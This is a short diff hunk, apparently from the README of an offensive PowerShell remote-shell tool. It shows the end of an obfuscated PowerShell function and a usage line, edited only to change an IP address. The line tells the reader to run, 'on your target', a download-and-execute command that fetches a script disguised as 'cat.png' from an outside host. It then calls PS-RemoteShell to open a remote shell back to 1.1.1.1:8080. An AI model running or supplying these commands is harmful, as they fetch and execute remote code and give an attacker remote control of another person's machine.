@@ -79,7 +79,7 @@ function Get-UserInfo { PROCESS { if( -not (Test-Path env:userdomain)) { $EOhvOh
 $gKnYkZ = Random-String -Length $mFkqJYoMKGl $MRdSPFQGDCQ = "hello $($gKnYkZ)" } $MRdSPFQGDCQ = $MRdSPFQGDCQ + "`n" $error.Clear() $ZKajjxCHtc = $MRdSPFQGDCQ + $YzFnzFOxZojQSmZ } } }
 ```
 
-On your target you can execute the PowerShell script using the following command `IEX (New-Object Net.WebClient).DownloadString("http://192.168.17.129:8080/cat.png"); PS-RemoteShell -ip 1.1.1.1 -port 8080 -key test`
+On your target you can execute the PowerShell script using the following command `IEX (New-Object Net.WebClient).DownloadString("http://1.1.1.1:8080/cat.png"); PS-RemoteShell -ip 1.1.1.1 -port 8080 -key test`
 
 ### Launching the server
 ```
